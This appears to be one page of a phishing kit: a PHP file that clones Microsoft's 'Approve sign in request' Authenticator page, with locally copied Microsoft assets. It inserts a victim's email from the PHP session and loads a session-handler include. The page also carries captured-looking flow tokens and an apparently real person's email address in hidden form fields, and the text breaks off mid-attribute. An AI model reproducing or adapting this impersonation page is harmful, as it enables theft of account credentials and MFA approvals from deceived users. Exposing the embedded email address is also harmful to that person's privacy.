<?php
error_reporting(0);
session_start();
$email = $_SESSION['email'];
include 'handler/session.php';

 ?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">



        <meta name="format-detection" content="telephone=no">


    
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">



    
    <link href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet" type="text/css">







<link href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet" type="text/css"><link href="./otp_files/ux.converged.tfa.strings-en.min_x6klxrnz09ytoalycec0tq2.js.download">

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
   


<div><!--  -->

<!--  -->

<form name="form" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="submit: form_onSubmit, autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="https://login.microsoftonline.com/common/SAS/ProcessAuth">

    <!-- ko withProperties: { '$tfaPage': $data } -->
    <div data-bind="component: { name: &#39;master-page&#39;,
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            handleWizardButtons: false,
            useWizardBehavior: svr.fUseWizardBehavior },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.fUseMinHeight }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.fUseMinHeight },
    component: { name: &#39;background-image-control&#39;,
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { &#39;sign-in-box&#39;: true },
            css: {
                &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                &#39;app&#39;: $page.backgroundLogoUrl,
                &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }"></div>

        <!-- ko if: isRequestPending --><!-- /ko -->

        <div>
            <!-- ko if: loadBannerLogo -->
            <div data-bind="component: { name: &#39;logo-control&#39;,
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: $tfaPage.bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./otp_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
            <!-- /ko -->

            <!-- ko if: asyncInitReady -->
            <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                    publicMethods: paginationControlMethods,
                    params: {
                        enableCssAnimation: svr.fEnableCssAnimation,
                        disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                        initialViewId: initialViewId,
                        initialSharedData: initialSharedData,
                        initialError: $tfaPage.serverError },
                    event: {
                        cancel: paginationControl_onCancel,
                        load: paginationControlHelper.onLoad,
                        unload: paginationControlHelper.onUnload,
                        loadView: view_onLoadView,
                        showView: view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
    <div data-bind="css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="slide-in-next">

        <div data-bind="component: { name: &#39;identity-banner-control&#39;,
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible --><!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?php echo $email; ?>"><?php echo $email; ?></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="6" data-showidentitybanner="true" data-bind="pageViewComponent: { name: &#39;session-approval-view&#39;,
                    params: {
                        serverData: svr,
                        sentProof: sharedData.sentProof,
                        username: sharedData.username,
                        supportsBack: true,
                        isInitialState: isInitialState,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        sessionApprovalError: sharedData.sessionApprovalError,
                        flowToken: sharedData.flowToken,
                        entropy: sharedData.entropy },
                    event: {
                        cancel: view_onCancel,
                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        submitReady: $tfaPage.view_onSubmitReady } }"><!--  -->

<input type="hidden" name="type" data-bind="value: &#39;22&#39;" value="22">
<input type="hidden" name="request" data-bind="value: svr.sCtx" value="rQQIARAAhZM9bON0GMbjuM2l5Y4rBfE9dLgBITmx_f_7qxISaewkTms7jp0m8WIcf-TLH4nj2nU2kJAYbz42YECFiZPQ6SbE2IVjpEI33AhCQoeEOpLCfGJ59T563nd49f6e3TJdIegKXsHfR8kKfngPMjQFITXCAGnTGORGOMYCl8YIhwMbi2Ro24r3d_cufvz2bxJ5o_Vphjx8ukTJC-RgkiSL1WG1mmVZJfK8qe1W7Cio-lboTMNxSj5CkCcI8qC47YZYT7sormjA4jhBEwxgOQqyOIVX5Jl4LgcSKfFCMuwPM7mO43JTXJ_0hUyaSYnUV4GsN-ZG0JjI-hDI_DxX-mJuNDcefzqXNvPDtQhO9Dk51O3E4FVc0o3ZcC2tFb2XXRXvKrWzZELelCiert3nxR0vigNzEa2SB-g3RVwzEic7zuRIEut9oRZM2mBz0WxqR0eqE_HhMsnFZmOQjpNzDjh5nmRtWWF4GOcNvccNCLkep945PvXP4ial8W6f7ol85zivjU1VO62nsBP3aZuKnawbd1emj4djoUUyhomRjDz3coemOqqz5gV_vKolnoAzATGAHM71QlLIZnPrjDHFE_XYW3l1o8mp2FAz8gAeAXLZDZfNWF_C7mQE-4JiqyYdCYDAxEzTjnibowY5n2mpZuh560gxieaYT9RRizKVYH2ajludVdoOiONaTbfUQVd3bEodaJoBIi1YNqy2M8WEkZmawzBkDEUTLtC3XvDzlPwOLW2aIAofo_dY4DAQeBumOMhikLYANoKujUEHOgRt4Swg4SXKRAs3nDoHizjypr77IpxSsqr8q1pR4FZqvv8Mfdfxo9hxww_9KHVDOwqT2LKTDXM3C0-2kN-2Xi-X9vbeLBwU3nsNRw_L5d29wo263kK-2N7A_NFPn49e-hlVHr1j_V5nfy1cblfBaRUn2v54wXcI4JywMmRgY2bN2rbUb2skpLnZclDNO3mL_QAcEvdLyP1S6bL0isibsqBrek3ma12eNPE_S1uf3So-3vnfeHxy-065sL-zc-urt7__5cur1tXtV3d3z6amH9mW7672_4vND3cK1y8_vP746V_Pvv6j9Q81">
<input type="hidden" name="mfaLastPollStart" data-bind="value: currentPollStartTime" value="1664648469431">
<input type="hidden" name="mfaLastPollEnd" data-bind="value: currentPollEndTime" value="1664648470767">

<!-- ko if: twoWayPollingNeeded -->
<input type="hidden" data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: &#39;PhoneAppNotification&#39;" name="mfaAuthMethod" value="PhoneAppNotification">
<!-- /ko -->

<!-- ko if: svr.canary -->
<input type="hidden" name="canary" data-bind="value: svr.canary" value="3V/01JlgpDP13dL8N474FjajJcMWJS2469jqX/yPyH8=6:1">
<!-- /ko -->

<div id="idDiv_SAOTCAS_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: title">Approve sign in request</div>
<div class="row text-body">
    <div data-bind="component: { name: &#39;proof-image-control&#39;, params: { type: PROOF.Type.TOTPAuthenticatorV2, small: true, animate: true } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 -->
    <!-- ko if: !svr.fUseNewAuthenticatorIcon --><!-- /ko -->

    <!-- ko if: svr.fUseNewAuthenticatorIcon -->
        <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small animate-pulse" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" data-bind="imgSrc, css: { &#39;small&#39;: small, &#39;animate-pulse&#39;: animate }" src="./otp_files/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
    <!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Certificate --><!-- /ko --></div>
    <div class="text-block-body overflow-hidden">
        <div id="idDiv_SAOTCAS_Description" data-bind="htmlWithBindings: description, childBindings: { &#39;idSpan_SAOTCAS_DescSessionID&#39;: { css: { &#39;bold&#39;: true } } }">Open your Microsoft Authenticator app and approve the request to sign in​.​</div>
        <!-- ko if: description2 --><!-- /ko -->
    </div>
</div>

<!-- ko if: displaySign --><!-- /ko -->

<div>
    <!-- ko if: doPolling --><!-- /ko -->
</div>

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="row no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown" style="display: none;">
            <div class="col-md-24 form-group no-margin-top checkbox">
                <label id="idLbl_SAOTCAS_TD_Cb">
                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                    <input id="idChkBx_SAOTCAS_TD" type="checkbox" value="true" data-bind="
                        attr: { name: svr.sTrustedDeviceCheckboxName },
                        ariaLabel: str[&#39;CT_SAOTCAS_STR_AddTD&#39;],
                        ariaDescribedBy: [&#39;idDiv_SAOTCAS_Title&#39;, &#39;idDiv_SAOTCAS_Description&#39;].concat(description2 ? [&#39;idDiv_RichContext_Description&#39;] : []).join(&#39; &#39;),
                        hasFocusEx: tdCheckbox.isShown,
                        checked: tdCheckbox.isChecked,
                        disable: tdCheckbox.isDisabled" name="rememberMFA" aria-label="Don&#39;t ask again for undefined days" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">
                    <span data-bind="text: str[&#39;CT_SAOTCAS_STR_AddTD&#39;]">Don't ask again for undefined days</span>
                </label>
            </div>
        </div>

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: showSwitchProofsLink -->
                    <div id="idDiv_SAOTCS_HavingTrouble" class="form-group" data-bind="
                            css: { &#39;no-margin-bottom&#39;: !svr.urlMoreInfo },
                            htmlWithBindings: toggleText,
                            childBindings: {
                                &#39;signInAnotherWay&#39;: {
                                    click: switchToOtcRequest_onClick,
                                    hasFocusEx: !tdCheckbox.isShown,
                                    ariaDescribedBy: [&#39;idDiv_SAOTCAS_Title&#39;, &#39;idDiv_SAOTCAS_Description&#39;].concat(description2 ? [&#39;idDiv_RichContext_Description&#39;] : []).join(&#39; &#39;) } }"><a href="https://login.microsoftonline.com/common/reprocess?ctx=rQQIARAAhZI_jNt0HMXj-C7kQkuPK6IglhsYEJKTn__HJzH4Yid27mzHsXNOvJjEfxIn_pM4PvucDSQkxs5lQbCgAzHQpWJCjLdQ1lPVoSOoEioSurEpzBXLV-_pveXp-6lVqTpK1UEdfAxjdXD0IUFTJEGQEwTHbAohmAlAmrhLIajD4NsIoyl7nBzU9i9__eEfDLonfJFDD5-uYOwSOpyl6XJ91GjkeV6PPc-33bodh41gHDl-NM2wRxD0GIIelHfdCBlol-U1hTcBQCmUxpsMSTQBCeryXLyQQwmTOD4dGaNcbgEgd8TNqcHn0lxKJUPFZb29MMP2TNZHuMwtCsUQC7OzzbizhbTtjzYifqovsJFupyanAkk356ONtFH0QX5dvqOw5-kMe3XixN-4L8p7XpyE1jJepw_g78tAM1MnP8nlWBJbBs-Gsy6-XTT37fhYdWIuWqWF2GkPs2l6weBOUaR5V1ZojkiKtj5ghqjcSjLvAvjBedIhNc41qIHI9U4Kdmqp2lkrI3qJQdlk4uT9pL-2AhBNeQGjTQvBaHnhFQ5F9lRnw_HBdM2mHg_oEB0SDGAGEcbn88X4nLbEU_XEW3sts8OoyEgzi5A4xrFVP1p1En1F9GcTwuAVW7WomMdRRMw17ZizGXJYcLmWaaZeCMeKhXamXKpOBNJSws1ZNhV666wboicsq4_VYV93bFIdapqJx1q4ao-7jo_wEyuzRlFEm4rGX8Lvv-bnGfYTXNmKMI6uYDpeupHvHC6T2PMD93WcZFhD-dcJcejW2SB4vAP9sfNutbK__17psPTROwA-qlZr-6VX7mYH-mZ3i-Gnv301efN3WHn0wfjPVvNJ6Wq3gZ81ANoNpkuuh-LOaVMmaKI9H8-7tmR0NYygmPlq2Ch6hdD8BD9C71eg-5XKVeVtkbNkXtd0VubYPodZ4K8K_OUb0M97_wv257duV0sHe3tf__iEvffttXB9626tdu5bQWyPA3d98B_wv9wu3bz18Oazp38_--658BI1&amp;sessionid=83d743fb-3948-46a3-b4ec-4d4d16a08324#" id="signInAnotherWay" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">I can't use my Microsoft Authenticator app right now</a></div>
                    <!-- /ko -->

                    <!-- ko if: svr.urlMoreInfo -->
                    <div class="form-group no-margin-bottom">
                        <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="text: str[&#39;CT_STR_More_Info&#39;], href: svr.urlMoreInfo, ariaLabel: str[&#39;CT_STR_More_Info_AriaLabel&#39;]" aria-label="More information about two step verification">More information</a>
                    </div>
                    <!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                params: {
                    serverData: svr,
                    isPrimaryButtonVisible: false,
                    isSecondaryButtonVisible: !showSwitchProofsLink,
                    secondaryButtonText: str[&#39;CT_SAOTCC_STR_Cancel&#39;] },
                event: {
                    secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
    externalCss: { &#39;button-field-container&#39;: true }" style="display: none;">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    &#39;button&#39;: true,
                    &#39;primary&#39;: true },
                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" style="display: none;">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
            <!-- /ko -->
        </div>

        <input type="hidden" name="login" data-bind="value: postUsername" value="dlorden@lovencontracting.com">
        <input type="hidden" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrL1DbfoQVzP6TF3aLB9kzoFrI1jSO-41nZ2gOj4pUxsG9D-9bV7IYuPg61t0bGEt-f_yrxYNK0eDWl2I5VxQtho9gqMcBi3gp6oeK5--0xSxXKJPvGgHHUkeV7GZ5FxbACyq_4CfOfXDXh_MVdFOqss3dmy0_BNq1gDdsQTUJPpGsqpZFslJi68Qgmvjc1lvb55ZavnQfAwnWaVGFEwFalQ5MKzjwIsYjqdK9XGzI03pMz7engskZlkziQchl-xj2ibISuzJiYO1D-81dy8cF6r8FRvuG6gmdVUarQuN3ayYYyZ5IWCxoh4Kl2f4ZfORx7oEKnI2o6VocXECiHVRtVwJ5mA_b2VFd5fgYvMdSB6DJIgBWLmdIbZMFfmjCD-wRxQs2t6JpVzDkf-xEgFkfNmzsys_WWXK7qk7C-shQFNnO1GnzaXYvxJVIiqmwjPgSDO4Rd7XRLbHl5gRaPnqhrHNN2EDzAbZL355IbUK3xreELKChlQbOzudndygEgU35s64H18PiO1rLq32HF44HMLjFkqV1QvhPLPdtlVJLzNrlBsE1WqG916U8n6EXAv19OLws4ILrjC62mC-St-TLVq0FLJZSJmn25_v89RfTyqrSdqfVKLIYEuvO7zqMcCc3r5vTjeRcgo6pKvUrXCtjmck0e94-WulUg5zoHR7m0PZxbKEPWTONuFyKClZf5rBaCY-ibE56uw2rxQVa8BYKVoi-9bx62ZVuoQxlji_ctvNF_N4c1zwi_Yhipj5byv1CHnFTUhngobAE2RCSRzIBLwT5vvs1cS_KNNrq1pCSr0VeOUTDt-RsTKUKNfgZEQJ5UbmgdPK1z1Kuw7CUwsPFBO16VqJ5pbMD6fqF-Af7s-GhZ4Zuis-WAP-XuT7CKHzetFCGDPbLzqVdeedyE6PXlQUSYMydttI5dppHME8M1FKUi9mNLoZnKmeu2fdBK1-SxPNCvKGq0zCgR9yRGEkTpSuv9ZRlFKXTY2pAeQQijM98gS1vjAB1HBUDao5WC5DY92vFbBkMxGagPE9AIx3_PZvViJibkechE5rObKC0mOps9HOgPDRMstbb7IIOySZKEgLkwcjmqY0gVWEMSF7Xj-6lPyRnT1Pggu5svaoZfGikPjKQTjXJndkAilO_8bfNIAA">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="7695012e-53ef-43b0-84e8-52e2aaf20c00">
        <input type="hidden" name="sacxt" data-bind="value: svr.iSAContext" value="">
        <input type="hidden" name="hideSmsInMfaProofs" data-bind="value: hideSmsInMfaProofs" value="false">
        <!-- ko if: sessionIdentifier --><!-- /ko -->

        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>

    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession --><!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            &#39;footer&#39;: true,
            &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: &#39;footer-control&#39;,
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.microsoftonline.com/common/reprocess?ctx=rQQIARAAhZI_jNt0HMXj-C7kQkuPK6IglhsYEJKTn__HJzH4Yid27mzHsXNOvJjEfxIn_pM4PvucDSQkxs5lQbCgAzHQpWJCjLdQ1lPVoSOoEioSurEpzBXLV-_pveXp-6lVqTpK1UEdfAxjdXD0IUFTJEGQEwTHbAohmAlAmrhLIajD4NsIoyl7nBzU9i9__eEfDLonfJFDD5-uYOwSOpyl6XJ91GjkeV6PPc-33bodh41gHDl-NM2wRxD0GIIelHfdCBlol-U1hTcBQCmUxpsMSTQBCeryXLyQQwmTOD4dGaNcbgEgd8TNqcHn0lxKJUPFZb29MMP2TNZHuMwtCsUQC7OzzbizhbTtjzYifqovsJFupyanAkk356ONtFH0QX5dvqOw5-kMe3XixN-4L8p7XpyE1jJepw_g78tAM1MnP8nlWBJbBs-Gsy6-XTT37fhYdWIuWqWF2GkPs2l6weBOUaR5V1ZojkiKtj5ghqjcSjLvAvjBedIhNc41qIHI9U4Kdmqp2lkrI3qJQdlk4uT9pL-2AhBNeQGjTQvBaHnhFQ5F9lRnw_HBdM2mHg_oEB0SDGAGEcbn88X4nLbEU_XEW3sts8OoyEgzi5A4xrFVP1p1En1F9GcTwuAVW7WomMdRRMw17ZizGXJYcLmWaaZeCMeKhXamXKpOBNJSws1ZNhV666wboicsq4_VYV93bFIdapqJx1q4ao-7jo_wEyuzRlFEm4rGX8Lvv-bnGfYTXNmKMI6uYDpeupHvHC6T2PMD93WcZFhD-dcJcejW2SB4vAP9sfNutbK__17psPTROwA-qlZr-6VX7mYH-mZ3i-Gnv301efN3WHn0wfjPVvNJ6Wq3gZ81ANoNpkuuh-LOaVMmaKI9H8-7tmR0NYygmPlq2Ch6hdD8BD9C71eg-5XKVeVtkbNkXtd0VubYPodZ4K8K_OUb0M97_wv257duV0sHe3tf__iEvffttXB9626tdu5bQWyPA3d98B_wv9wu3bz18Oazp38_--658BI1&amp;sessionid=83d743fb-3948-46a3-b4ec-4d4d16a08324#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
